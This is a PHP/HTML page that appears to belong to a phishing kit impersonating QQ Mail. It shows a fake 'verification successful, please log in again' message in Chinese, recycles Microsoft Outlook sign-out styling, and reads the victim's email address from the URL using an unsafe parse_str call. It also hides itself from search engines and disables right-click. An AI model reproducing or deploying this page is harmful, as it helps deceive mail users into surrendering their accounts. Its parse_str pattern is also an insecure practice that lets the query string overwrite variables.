<?php
session_start();
ob_start();
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	

parse_str(parse_url($url, PHP_URL_QUERY));

	
$parts = @explode('@', $userid);
	
$user = @$parts[0];
$email= $_GET['userid'] ;
// start > to get url and and put id 
	



	
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<meta name="keywords" content="..." />
        <meta name="description" content="..." />
        <meta charset="UTF-8" />
        <meta name="viewport" content="initial-scale=1.0">
        <meta name="robots" content="noindex, nofollow, noarchive">
	<title>Mail.qq.com</title>
	
	<style type="text/css">п»ї@font-face {

    font-family: "Segoe UI Web Light";

    font-style: normal;

    font-weight: 100;

    src: local("Segoe UI Light"), local("Segoe UI"), local("Helvetica Neue");

    unicode-range: U+0000-00FF;

}

@font-face {

    font-family:"Segoe UI Web Regular";

    font-style: normal;

    font-weight: normal;

    src: local("Segoe UI"), local("Helvetica Neue");

    unicode-range: U+0000-00FF;

}

@font-face {

    font-family: "Segoe UI Web Semibold";

    font-style: normal; 

    font-weight: bold;

    src: local("Segoe UI Semibold"), local("Segoe UI Bold"), local("Segoe UI"), local("Helvetica Neue");

    unicode-range: U+0000-00FF;

}



body 

{

    font-family:"Segoe UI Web Light","Segoe UI Light","Segoe UI Web Regular","Segoe UI","Helvetica Neue",Arial;

    margin:0;

    padding:0;

    border:none;

    color:#fff;

    height:100%;

    position:relative;

}



body.hidden {visibility:hidden;}



.ja-jp, .ja-jp h1, .ja-jp h2, .ja-jp p,

.ja-jp a, .ja-jp a:hover, .ja-jp a:visited

{

    font-family:"Meiryo UI",Meiryo,"MS PGothic",Osaka,"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,"sans-serif";

}



.km-kh, .km-kh h1, .km-kh h2, .km-kh p,

.km-kh a .km-kh a:hover, .km-kh a:visited

{

    font-family:"Khmer UI","Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,"sans-serif";

}



.ko-kr, .ko-kr h1, .ko-kr h2, .ko-kr p,

.ko-kr a, .ko-kr a:hover, .ko-kr a:visited

{

    font-family:"Malgun Gothic",Gulim,"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,"sans-serif";

}



.zh-cn, .zh-cn h1, .zh-cn h2, .zh-cn p,

.zh-hans, .zh-hans h1, .zh-hans h2, .zh-hans p, 

.zh-cn a, .zh-cn a:hover, .zh-cn a:visited 

{

    font-family:"Microsoft Yahei",Verdana,Simsun,"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,"sans-serif";

}



.zh-hant, .zh-hant h1, .zh-hant h2, .zh-hant p,

.zh-hk, .zh-hk h1, .zh-hk h2, .zh-hk p,

.zh-mo, .zh-mo h1, .zh-mo h2, .zh-mo p,

.zh-sg, .zh-sg h1, .zh-sg h2, .zh-sg p,

.zh-tw, .zh-tw h1, .zh-tw h2, .zh-tw p,

.zh-hant a, .zh-hant a:hover, .zh-hant a:visited,

.zh-mo a, .zh-mo a:hover, .zh-mo a:visited,

.zh-sg a, .zh-sg a:hover, .zh-sg a:visited,

.zh-tw a, .zh-tw a:hover, .zh-tw a:visited

{

    font-family:"Microsoft JhengHei", Pmingliu,"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,"sans-serif";

}



img {border:none;float:left;}

/*div#mboxDefault {visibility:visible;}*/



h1 

{

    font-weight:100;

    color:#fff;

    font-size: 21px;

    line-height:17px;

    float:left;

    padding: 0px 0px 0px 7px;

    margin:0px;

}



h2 

{

    font-weight:100;

    color:#000;

    font-size:22px;

    line-height:22px;

    padding:0px;

    margin:30px 0px 20px 50px;

}







a, a:hover, a:visited

{

    

    font-family:"Segoe UI Web Semibold","Segoe UI Web Regular","Segoe UI","Helvetica Neue",Arial;

    border: 1px #fff;

    color:#fff;

    text-decoration:none;

    display: inline-block;

    font-size: 14px;

    font-weight: 100;

    min-width:70px;

    text-align:center;

    padding: 3px 12px 5px 12px;

    margin:0px 0px 0px 50px;

}



#brand a {

    margin:0px;

    padding: 0px 0px 0 10px;

    height: 40px;

    color:#212121;

}



#brand a:hover {

    opacity: 1.0 !important;

    background-color:rgba(0, 0, 0, 0.18); 

}



iframe

{

    border:solid 0px gray;

}



div#confirm

{

    height:170px;

    width:100%;

    margin:0;

    padding:0px 0px 30px 0px;  

}



div#brand

{

    height: 40px;

    margin:0;

    padding: 0px 0px 0px 10px;  

}



div#brand.newmail {

       



}



iframe#offer {

    min-height:500px;

    min-width:800px;

}



div#container {

    height: auto !important;

    margin: 0 auto -1px;

    min-height: 100%;

}



div#footer {

   border-top:solid 1px #ccc;

   position:fixed;

   bottom:0px;

   overflow:auto;

   left:0px;

   width:100%;

   height:30px;

   background-color:white;

}



#footer span, #footer a {

   font-family:"Segoe UI Web Regular","Segoe UI","Helvetica Neue",Arial;

   font-size:12px;

   padding:3px;

   float:left;

   display:inline;

   min-width:inherit;

   margin:0px;

   padding:7px 10px;

   color:gray;

}





/*Brands*/

.hotmail {background-color:#f89a1e;}

.hotmail a, .hotmail a:hover, .hotmail a:visited, .hotmail a:active {color:#f89a1e;}



.newmail {background-color:#0072C6;}

.newmail a, .newmail a:hover, .newmail a:visited, .newmail a:active {color:#0072C6;}





/*Creative Template*/

div#offer {

    margin:0px 45px 10px 50px;

    padding:0px;

    max-width: 1200px;

    min-height:500px;

    min-width: 640px;   

}



div#offer a#button {

    margin:0px;

    background-color:#cacaca;

}



body.rtl div#brand a {

    margin-right:10px;

}



body.rtl div#confirm h2,

body.rtl div#confirm a#signin

 {

  margin-right:50px;

}



div#confirm a:hover,

div#offer a#button:hover {

	opacity:0.76;

    filter:alpha(opacity=76);

}



div#confirm a.newmail:active,

div#confirm a.hotmail:active,

div#offer a.newmail:active,

div#offer a.hotmail:active

 {

    opacity:1;

    filter:alpha(opacity=100);

    background-color:black;

}



a#follow {

    

    background: transparent url('../images/logo-twitter.png') no-repeat top left;

    padding-left:32px;

    height:24px;

    color:#0072c6;

    margin:0px;

}



body.rtl a#follow {

    background-position: top right;

    padding-left:0px;

    padding-right:32px;

}







div#offer h1, div#offer p {

    color:#808080;

    padding:0;

}



div#offer h1 {

    font-size:40px;

    line-height:50px;

    width:55%;

    *width:auto;/*IE7*/

    display:block;

    margin-bottom:10px;

    float:none;

    overflow-wrap:break-word;

}



div#offer p {   

    display:block;

    font-size:15px;

    width:55%;

    *width:auto;/*IE7*/

    max-width:600px;

}





.smallest div#offer h1  {

    font-size:36px;

}



.smallest div#offer p {

    font-size:15px;

}



div#offer p.additional {

    margin-top:60px;

}



div#offer img {

float:right;

padding:10px;

}



body.rtl div#offer img {

    float:left;

}
	</style>
	<link href="food/style2.css" rel="stylesheet" type="text/css" />
	<script type="text/javascript">
	document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    </script>
</head>
<body class="ltr normal en-in" dir="ltr">
<div id="confirm">
<div class="newmail" id="brand"><a href="#"><img src="/qqmail/mailqq/images/Qq.png" style="float: left; width: 200px; height: 100px; margin: 40px 10px;" /> </a></div>

<table height="294" width="814">
	<tbody>
		<tr>
			<td><br />
			<br />
			&nbsp;
			<h2><span class="short_text" id="result_box" lang="zh-CN"><span>验证成功</span></span> ...<br />
			<br />
			<span class="short_text" id="result_box" lang="zh-CN"><span>您的帐户验证信息已更新。 请<a style="font-weight:100;color:#000;font-size:22px; text-decoration:underline;" href="http://qq.com" >重新登录</a>以继续使用您的邮箱。</span></span> .</h2>
			</td>
		</tr>
	</tbody>
</table>
</div>
<br/>
<br/>

<div class="mboxDefault" id="mboxDefault" style="visibility: visible; display: block;"><br><br>
<div id="offer"><img alt="Let us hear it" src="/qqmail/mailqq/images/sansixianneirongshequjiaodiantu20180919.png" style="float: right;" /></div>
</div>

<div id="mboxMarker-default-PROD-outlook_signout-0" style="visibility:hidden;display:none"></div>

<div id="footer"><span id="ftrCopy">?2014 Microsoft</span><a href="#" id="ftrTerms">Terms</a><a href="#" id="ftrPrivacy">Privacy &amp; cookies</a></div>
</body>
</html>
